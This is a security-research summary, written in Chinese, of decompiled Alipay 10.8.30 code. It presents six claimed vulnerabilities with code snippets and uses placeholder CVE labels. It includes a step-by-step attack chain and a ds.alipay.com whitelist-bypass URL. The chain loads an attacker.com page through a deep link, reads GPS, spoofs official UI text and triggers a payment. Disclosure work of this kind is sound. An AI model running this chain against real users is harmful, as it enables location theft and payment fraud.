# Alipay APK 代码证据汇总

> APK 版本: Alipay 10.8.30.8000 (jadx 反编译)
> 生成日期: 2026-03-16
> 证据范围: 6个 CVE 的关键源码片段

---

## 快速索引

| CVE | 标题 | CWE | CVSS | 关键文件 | 证据文件 |
|-----|------|-----|------|---------|---------|
| CVE-1 | DeepLink URL Scheme绕过 | CWE-939 | 9.1 | SchemeLauncherActivity.java, SchemeServiceImpl.java | [cve1/code_evidence.md](cve1/code_evidence.md) |
| CVE-2 | GPS静默外泄 | CWE-359 | 7.4 | H5LocationPlugin.java | [cve2/code_evidence.md](cve2/code_evidence.md) |
| CVE-3 | tradePay未授权调用 | CWE-940 | 8.6 | H5TradePayPlugin.java | [cve3/code_evidence.md](cve3/code_evidence.md) |
| CVE-4 | UI欺骗 showToast/setTitle | CWE-451 | 8.1 | H5ToastPlugin.java, BNTitlePlugin.java | [cve4/code_evidence.md](cve4/code_evidence.md) |
| CVE-5 | 端到端数据外泄链 | CWE-200 | 8.6 | (引用 CVE-1~4) | [cve5/code_evidence.md](cve5/code_evidence.md) |
| CVE-6 | ds.alipay.com白名单绕过 | CWE-601+939 | 9.3 | ApiShareConfig.java, H5ServiceImpl.java | [cve6/code_evidence.md](cve6/code_evidence.md) |

---

## CVE-1: DeepLink URL Scheme绕过

**关键代码位置**:
- `sources/com/alipay/mobile/quinox/SchemeLauncherActivity.java` — 行 240-338
- `sources/com/alipay/mobile/framework/service/common/impl/SchemeServiceImpl.java` — 行 1161-1179, 2108-2124

**核心问题**: `getParams(Uri uri)` 将所有 URI query parameter 原样复制到 Bundle，无域名白名单过滤；`startApp("", "20000067", bundle)` 以 H5 WebView appId 直接加载攻击者 URL。

```java
// SchemeServiceImpl.java 行 1174-1177
Bundle bundle = new Bundle();
for (String str : o(uri2)) {
    bundle.putString(str, uri2.getQueryParameter(str));  // 无白名单过滤
}
```

```java
// SchemeServiceImpl.java 行 2123
this.this$0.getMicroApplicationContext().startApp(null, "20000067", params, extInfo, null);
// "20000067" = H5 WebView 容器，url 参数未经验证
```

---

## CVE-2: GPS静默外泄

**关键代码位置**:
- `sources/com/alipay/mobile/h5plugin/H5LocationPlugin.java` — 行 949-958 (getLocation), 1367-1395 (judgeGrant)

**核心问题**: `judgeGrant()` 仅检查 OS 位置权限，无 WebView 页面来源域名校验。

```java
// H5LocationPlugin.java 行 1379-1382
LBSService lBSService = (LBSService) ComponentService.get(LBSService.class);
if (lBSService != null && lBSService.hasLocationPermission()) {
    z = true;  // 唯一判断：OS权限已授予。无来源域名校验。
}
```

```java
// H5LocationPlugin.java 行 953-957
if (judgeGrant(h5Event.getTarget() instanceof H5Page ? (H5Page) h5Event.getTarget() : null, h5BridgeContext)) {
    new H5GetLocationAction(h5Event, h5BridgeContext, this.h5Location, j).handleEvent();
    // GPS 坐标直接回调给 WebView
}
```

---

## CVE-3: tradePay未授权调用

**关键代码位置**:
- `sources/com/alipay/mobile/framework/service/ext/phonecashier/H5TradePayPlugin.java` — 行 522-603, 686-701

**核心问题**: `onPrepare()` 对所有页面注册 `tradePay` 动作；`startPaymentWithOrderStr()` 中来源 URL 只放入日志 Map，不做拒绝决策。

```java
// H5TradePayPlugin.java 行 698
h5EventFilter2.addAction("tradePay");  // 所有页面均可调用，无域名过滤
```

```java
// H5TradePayPlugin.java 行 577-592
str4 = H5PayUtil.generateH5bizContext4OrderStr(str4, h5Page.getUrl());
hashMap.put("invoke_from_source", "h5page");
hashMap.put("invokeFromReferUrl", realRefer);   // 仅日志，无访问控制
// ...
phoneCashierServcie.boot(str4, a(aVar, null, null), hashMap);  // 直接启动收银台
```

---

## CVE-4: UI欺骗 showToast/setTitle

**关键代码位置**:
- `sources/com/alipay/mobile/nebulacore/plugin/H5ToastPlugin.java` — 行 144-163, 213-225
- `sources/com/alipay/android/app/birdnest/jsplugin/BNTitlePlugin.java` — 行 84-91

**核心问题**: JS 传入的 `content`/`title` 字符串直接传入 `Toast.makeText()` 和 `mTitleBar.setTitleText()`，无内容过滤，无来源检查。

```java
// H5ToastPlugin.java 行 151-158
String string = XriverH5Utils.getString(param, "content");  // JS 传入，攻击者控制
// ...
showToast(h5Event.getActivity(), getImageId(string2), string, 17, 0, 0, i3);
// string 直接传入 Toast.makeText，无任何过滤
```

```java
// BNTitlePlugin.java 行 85-88
String optString2 = new JSONObject(bNEvent2.getArgs()).optString("title", null);
if (optString2 != null) {
    bNTitlePlugin.mTitleBar.setTitleText(optString2);  // 攻击者字符串直接渲染到导航栏
}
```

---

## CVE-5: 端到端数据外泄链

CVE-5 是 CVE-1 + CVE-2 + CVE-3 + CVE-4 的组合，无独立代码。完整攻击链：

```
1. alipays://platformapi/startApp?appId=20000067&url=https://attacker.com
       → SchemeLauncherActivity (CVE-1入口)
2. my.getLocation()
       → judgeGrant(): hasLocationPermission()==true → 返回GPS坐标 (CVE-2)
3. my.setTitle({ title: "支付宝官方安全验证" })
   my.showToast({ content: "身份验证通过 ✓" })
       → 伪造系统UI (CVE-4)
4. my.tradePay({ orderStr: "...total_amount=999..." })
       → 触发支付界面，用户被诱导确认 (CVE-3)
```

参考: [cve5/code_evidence.md](cve5/code_evidence.md)

---

## CVE-6: ds.alipay.com白名单绕过

**关键代码位置**:
- `sources/com/alipay/common/ApiShareConfig.java` — 行 52-59
- `sources/com/alipay/mobile/nebulaappproxy/api/config/WalletDefaultConfig.java` — 行 77
- `sources/com/alipay/mobile/nebulacore/wallet/H5ServiceImpl.java` — 行 1263-1277

**核心问题**: `h5_stripLandingConfig` 将 `ds.alipay.com` 列为受信任前缀，`startAppNormal:true` 允许自动提取 `scheme` 参数并以内部信任级别分发，实现绕过 `isOutside` 检查。

```java
// ApiShareConfig.java 行 59 (精简)
H5_STRIP_LANDING_CONFIG =
    "{\"urlPrefix\":[\"https://ds.alipay.com/?\",...],\"startAppNormal\":true,...}";
//                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^           ^^^^^^^^^^^^^^^^
//                    ds.alipay.com 被列为受信任                允许自动分发
```

```java
// H5ServiceImpl.java 行 1268-1272
if (XriverH5Utils.isStripLandingURLEnable(str2, "startAppNormal")) {
    String stripLandingURL = XriverH5Utils.getStripLandingURL(str2);
    // str2 = "https://ds.alipay.com/?scheme=alipays://...attacker.com..."
    // getStripLandingURL 提取 scheme 参数值 → 攻击者的 alipays:// URI
    boolean goToSchemeService = h5EnvProvider.goToSchemeService(stripLandingURL, params);
    // 以内部信任级别分发，绕过外部来源标记
}
```

---

## 代码证据质量评估

| CVE | 找到直接证据 | 证据强度 | 说明 |
|-----|------------|---------|------|
| CVE-1 | 是 | 强 | SchemeServiceImpl.getParams() + startApp("20000067") 完整链路 |
| CVE-2 | 是 | 强 | judgeGrant() 仅检查 OS 权限，代码一目了然 |
| CVE-3 | 是 | 强 | H5TradePayPlugin.onPrepare() + boot() 无来源检查 |
| CVE-4 | 是 | 强 | H5ToastPlugin + BNTitlePlugin 两个实现均已找到 |
| CVE-5 | 是 | 强 | 组合链，各 CVE 证据已独立确认 |
| CVE-6 | 是 | 强 | stripLandingConfig JSON 硬编码在两个源文件中 |

所有证据均来自 jadx 反编译的 Java 源码，文件路径可在 `/Users/anwu/Desktop/apk_any/apk/alipay/analysis/jadx_output/sources/` 下直接验证。
